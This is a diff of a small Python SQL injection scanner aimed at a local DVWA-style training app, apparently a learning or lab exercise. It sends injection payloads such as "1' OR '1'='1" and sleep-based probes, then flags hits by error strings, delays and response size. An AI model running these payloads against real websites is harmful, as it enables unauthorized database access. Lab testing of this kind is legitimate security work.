@@ -1,16 +1,9 @@
 #!/usr/bin/env python3
-"""
-SQL Injection Vulnerability Scanner (Professional Version)
-Author: Youssef
-Description: Detects SQL injection vulnerabilities with reduced false positives
-"""
 
 import requests
 import sys
 import time
 from datetime import datetime
-
-# ─── CONFIGURATION ───────────────────────────────────────────────
 
 TARGET_URL = "http://127.0.0.1:42001/vulnerabilities/sqli/"
 
@@ -18,8 +11,6 @@ SESSION_COOKIE = {
     "PHPSESSID": "9e124456d84d6cd2cecb9df8d2f9c4d0",
     "security": "low"
 }
-
-# ─── PAYLOADS ───────────────────────────────────────────────────
 
 PAYLOADS = [
     ("Basic OR bypass",          "1' OR '1'='1"),
@@ -36,156 +27,98 @@ PAYLOADS = [
 ]
 
 SUCCESS_INDICATORS = [
-    "first name", "surname", "admin",
-    "mysql", "warning", "error",
-    "unknown column", "sql",
-    "information_schema"
+    "first name", "surname", "admin", "mysql", 
+    "warning", "error", "unknown column", 
+    "sql", "information_schema"
 ]
 
-SEPARATOR = "─" * 70
-
-
-# ─── FUNCTIONS ──────────────────────────────────────────────────
-
 def print_banner():
-    print(f"""
-{SEPARATOR}
-SQL Injection Scanner — Professional Version
-Target: {TARGET_URL}
-Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-{SEPARATOR}
-""")
-
+    print("-" * 60)
+    print("SQL Injection Scanner")
+    print(f"Target: {TARGET_URL}")
+    print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("-" * 60)
 
 def get_baseline(session):
     try:
         resp = session.get(TARGET_URL, params={"id": "1", "Submit": "Submit"})
         return resp.text
     except Exception as e:
-        print(f"[ERROR] Cannot reach target: {e}")
+        print(f"[ERROR] Connection failed: {e}")
         sys.exit(1)
-
 
 def is_vulnerable(response, baseline, elapsed, payload):
     response_lower = response.lower()
 
-    # 1. Strong indicators (most reliable)
     for indicator in SUCCESS_INDICATORS:
         if indicator in response_lower:
-            return True, f"Strong indicator found: {indicator}"
+            return True, f"Found: {indicator}"
 
-    # 2. Time-based detection
     if "sleep" in payload.lower() and elapsed > 1.5:
-        return True, f"Time-based delay detected ({elapsed:.2f}s)"
+        return True, f"Time-delay: {elapsed:.2f}s"
 
-    # 3. Response size difference (only if meaningful)
     if len(response) > 0 and abs(len(response) - len(baseline)) > 200:
-        return True, f"Significant response difference ({len(response)} vs {len(baseline)})"
+        return True, f"Response shift ({len(response)} vs {len(baseline)})"
 
-    # Ignore empty responses (prevent false positives)
-    if len(response) == 0:
-        return False, "Empty response ignored"
-
-    return False, "No reliable indicator"
-
+    return False, "Safe"
 
 def scan(session, baseline):
     results = []
     vuln_count = 0
 
-    print("[*] Starting SQL Injection Scan...\n")
+    print("[*] Running vulnerability checks...\n")
 
     for i, (name, payload) in enumerate(PAYLOADS, 1):
-        print(f"[{i:02d}] Testing: {name}")
-        print(f"     Payload: {payload}")
+        print(f"[{i:02d}] {name}...")
 
         try:
             start = time.time()
-
             resp = session.get(
                 TARGET_URL,
                 params={"id": payload, "Submit": "Submit"},
                 timeout=10
             )
-
             elapsed = time.time() - start
-
-            print(f"     Response size: {len(resp.text)} bytes | Time: {elapsed:.2f}s")
 
             vuln, reason = is_vulnerable(resp.text, baseline, elapsed, payload)
 
             if vuln:
-                print(f"     [!] VULNERABLE → {reason}\n")
+                print(f"     [!] VULNERABLE: {reason}\n")
                 vuln_count += 1
             else:
-                print(f"     [-] Not vulnerable → {reason}\n")
+                print(f"     [-] Clear\n")
 
             results.append({
                 "name": name,
                 "payload": payload,
                 "vulnerable": vuln,
-                "reason": reason,
-                "time": elapsed
+                "reason": reason
             })
 
         except Exception as e:
-            print(f"     [ERROR] {e}\n")
+            print(f"     [!] Error: {e}\n")
 
     return results, vuln_count
 
-
 def print_summary(results, vuln_count):
-    print(SEPARATOR)
-    print("SCAN SUMMARY")
-    print(SEPARATOR)
-
-    print(f"Total payloads: {len(results)}")
-    print(f"Vulnerable:     {vuln_count}")
-    print(f"Safe:           {len(results) - vuln_count}\n")
-
-    print("CONFIRMED VULNERABILITIES:\n")
+    print("-" * 60)
+    print(f"RESULTS: {vuln_count} Vulnerabilities Found")
+    print("-" * 60)
 
     for r in results:
         if r["vulnerable"]:
-            print(f"- {r['name']}")
-            print(f"  Payload: {r['payload']}")
-            print(f"  Reason:  {r['reason']}\n")
-
-
-def save_report(results):
-    filename = f"sqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-
-    with open(filename, "w") as f:
-        f.write("SQL INJECTION SCAN REPORT\n")
-        f.write(f"Date: {datetime.now()}\n")
-        f.write(f"Target: {TARGET_URL}\n\n")
-
-        for r in results:
-            f.write(f"[{'+' if r['vulnerable'] else '-'}] {r['name']}\n")
-            f.write(f"Payload: {r['payload']}\n")
-            f.write(f"Result: {'VULNERABLE' if r['vulnerable'] else 'SAFE'}\n")
-            f.write(f"Reason: {r['reason']}\n\n")
-
-    print(f"[*] Report saved: {filename}")
-
-
-# ─── MAIN ───────────────────────────────────────────────────────
+            print(f"[*] {r['name']} ({r['reason']})")
+    print("")
 
 def main():
     print_banner()
-
     session = requests.Session()
     session.cookies.update(SESSION_COOKIE)
 
-    print("[*] Getting baseline response...")
     baseline = get_baseline(session)
-    print(f"[*] Baseline size: {len(baseline)} bytes\n")
-
     results, vuln_count = scan(session, baseline)
 
     print_summary(results, vuln_count)
-    save_report(results)
-
 
 if __name__ == "__main__":
     main()
